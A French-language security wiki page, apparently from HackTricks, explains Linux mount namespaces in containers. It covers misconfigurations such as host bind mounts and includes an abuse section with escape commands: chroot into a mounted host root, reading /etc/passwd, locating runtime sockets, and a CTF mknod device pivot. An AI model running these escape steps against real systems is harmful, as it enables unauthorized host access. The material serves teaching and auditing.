# Espace de noms de montage

{{#include ../../../../../banners/hacktricks-training.md}}

## Vue d'ensemble

L'espace de noms de montage contrôle la **table de montage** qu'un processus voit. Il s'agit de l'une des fonctionnalités les plus importantes pour l'isolation des conteneurs, car le système de fichiers racine, les bind mounts, les montages tmpfs, la vue procfs, l'exposition de sysfs et de nombreux montages auxiliaires spécifiques au runtime sont tous exprimés par cette table de montage. Deux processus peuvent tous deux accéder à `/`, `/proc`, `/sys` ou `/tmp`, mais les ressources vers lesquelles ces chemins pointent dépendent de l'espace de noms de montage dans lequel ils se trouvent.

Du point de vue de la sécurité des conteneurs, l'espace de noms de montage fait souvent la différence entre « il s'agit d'un système de fichiers d'application soigneusement préparé » et « ce processus peut voir ou influencer directement le système de fichiers de l'hôte ». C'est pourquoi les bind mounts, les volumes `hostPath`, les opérations de montage privilégiées et les expositions inscriptibles de `/proc` ou `/sys` reposent tous sur cet espace de noms.

## Fonctionnement

Lorsqu'un runtime lance un conteneur, il crée généralement un nouvel espace de noms de montage, prépare un système de fichiers racine pour le conteneur, monte procfs et les autres systèmes de fichiers auxiliaires nécessaires, puis ajoute éventuellement des bind mounts, des montages tmpfs, des secrets, des config maps ou des chemins de l'hôte. Une fois que le processus s'exécute dans cet espace de noms, l'ensemble des montages qu'il voit est largement découplé de la vue par défaut de l'hôte. L'hôte peut toujours voir le véritable système de fichiers sous-jacent, mais le conteneur voit la version assemblée pour lui par le runtime.

Cela est puissant, car le conteneur peut croire qu'il possède son propre système de fichiers racine, même si l'hôte continue de tout gérer. C'est également dangereux, car si le runtime expose le mauvais montage, le processus obtient soudainement une visibilité sur des ressources de l'hôte que le reste du modèle de sécurité n'était peut-être pas conçu pour protéger.

## Lab

Vous pouvez créer un espace de noms de montage privé avec :
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
Si vous ouvrez un autre shell en dehors de ce namespace et inspectez la table de montage, vous verrez que le montage tmpfs existe uniquement à l’intérieur du namespace de montage isolé. C’est un exercice utile, car il montre que l’isolation des montages n’est pas une théorie abstraite ; le kernel présente littéralement une table de montage différente au processus.

Si vous ouvrez un autre shell en dehors de ce namespace et inspectez la table de montage, le montage tmpfs existera uniquement à l’intérieur du namespace de montage isolé.

À l’intérieur des conteneurs, une comparaison rapide est :
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
Le deuxième exemple montre à quel point une configuration runtime peut créer une énorme brèche à travers la frontière du filesystem.

## Utilisation du runtime

Docker, Podman, les stacks basées sur containerd et CRI-O reposent tous sur un mount namespace privé pour les containers normaux. Kubernetes s'appuie sur le même mécanisme pour les volumes, les secrets projetés, les config maps et les mounts `hostPath`. Les environnements Incus/LXC reposent également largement sur les mount namespaces, notamment parce que les system containers exposent souvent des filesystems plus riches et plus proches d'une machine que les application containers.

Cela signifie que lorsque vous examinez un problème de filesystem de container, vous n'êtes généralement pas face à une simple particularité de Docker. Vous êtes face à un problème de mount namespace et de configuration du runtime, exprimé par la plateforme ayant lancé le workload.

## Mauvaises configurations

L'erreur la plus évidente et la plus dangereuse consiste à exposer le filesystem root de l'hôte ou un autre chemin sensible de l'hôte via un bind mount, par exemple `-v /:/host` ou un `hostPath` accessible en écriture dans Kubernetes. À ce stade, la question n'est plus « le container peut-il s'échapper d'une manière ou d'une autre ? », mais plutôt « quelle quantité de contenu utile de l'hôte est déjà directement visible et accessible en écriture ? ». Un bind mount de l'hôte accessible en écriture transforme souvent le reste de l'exploit en une simple opération de placement de fichiers, de chroot, de modification de configuration ou de découverte du runtime socket.

Un autre problème courant consiste à exposer `/proc` ou `/sys` de l'hôte d'une manière qui contourne la vue plus sûre du container. Ces filesystems ne sont pas de simples mounts de données ; ce sont des interfaces vers l'état du kernel et des processus. Si le workload accède directement aux versions de l'hôte, de nombreuses hypothèses sur lesquelles repose le hardening des containers cessent de s'appliquer correctement.

Les protections en lecture seule sont également importantes. Un filesystem root en lecture seule ne sécurise pas magiquement un container, mais il supprime une grande partie de l'espace de staging disponible pour l'attaquant et rend plus difficiles la persistence, le placement de helper binaries et la modification de configuration. À l'inverse, un root accessible en écriture ou un bind mount de l'hôte accessible en écriture fournit à l'attaquant l'espace nécessaire pour préparer l'étape suivante.

## Abus

Lorsqu'un mount namespace est mal utilisé, les attaquants font généralement l'une des quatre choses suivantes. Ils **lisent des données de l'hôte** qui auraient dû rester hors du container. Ils **modifient la configuration de l'hôte** via des bind mounts accessibles en écriture. Ils **mountent ou remontent des ressources supplémentaires** si les capabilities et seccomp l'autorisent. Ou ils **accèdent à des sockets puissants et à des répertoires d'état du runtime** qui leur permettent de demander davantage d'accès à la plateforme de containers elle-même.

Si le container peut déjà voir le filesystem de l'hôte, le reste du modèle de sécurité change immédiatement.

Lorsque vous suspectez la présence d'un bind mount de l'hôte, commencez par confirmer ce qui est disponible et si l'accès en écriture est possible :
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
Si le système de fichiers racine de l’hôte est monté en lecture-écriture, l’accès direct à l’hôte est souvent aussi simple que :
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
Si l’objectif est d’obtenir un accès privilégié au runtime plutôt que d’effectuer un chroot direct, énumérez les sockets et l’état du runtime :
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
Si `CAP_SYS_ADMIN` est présent, testez également si de nouveaux mounts peuvent être créés depuis l’intérieur du container :
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### Exemple complet : pivot `mknod` à deux shells

Une méthode d’abus plus spécialisée apparaît lorsque l’utilisateur root du container peut créer des block devices, que le host et le container partagent une identité utilisateur exploitable, et que l’attaquant dispose déjà d’un foothold avec de faibles privilèges sur le host. Dans cette situation, le container peut créer un device node tel que `/dev/sda`, et l’utilisateur du host disposant de faibles privilèges peut ensuite le lire via `/proc/<pid>/root/` pour le processus correspondant du container.

Dans le container :
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
Depuis l’hôte, en tant que l’utilisateur correspondant à faibles privilèges après avoir localisé le PID du shell du conteneur :
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
La leçon importante ne concerne pas la recherche exacte de la chaîne CTF. Elle est que l’exposition du mount namespace via `/proc/<pid>/root/` peut permettre à un utilisateur de l’hôte de réutiliser des device nodes créés par le container, même lorsque la policy des devices du cgroup empêchait leur utilisation directe à l’intérieur du container lui-même.

## Vérifications

Ces commandes servent à vous montrer la vue du filesystem dans laquelle le processus actuel s’exécute réellement. L’objectif est de repérer les mounts provenant de l’hôte, les chemins sensibles accessibles en écriture et tout élément qui semble plus large que le root filesystem d’un container d’application normal.
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
Ce qui est intéressant ici :

- Les bind mounts provenant de l'hôte, en particulier `/`, `/proc`, `/sys`, les répertoires d'état d'exécution ou les emplacements de sockets, doivent immédiatement attirer l'attention.
- Les montages read-write inattendus sont généralement plus importants qu'un grand nombre de montages auxiliaires read-only.
- `mountinfo` est souvent le meilleur endroit pour déterminer si un chemin provient réellement de l'hôte ou s'il est adossé à un overlay.

Ces vérifications permettent d'établir **quelles ressources sont visibles dans ce namespace**, **lesquelles proviennent de l'hôte** et **lesquelles sont accessibles en écriture ou sensibles du point de vue de la sécurité**.
{{#include ../../../../../banners/hacktricks-training.md}}
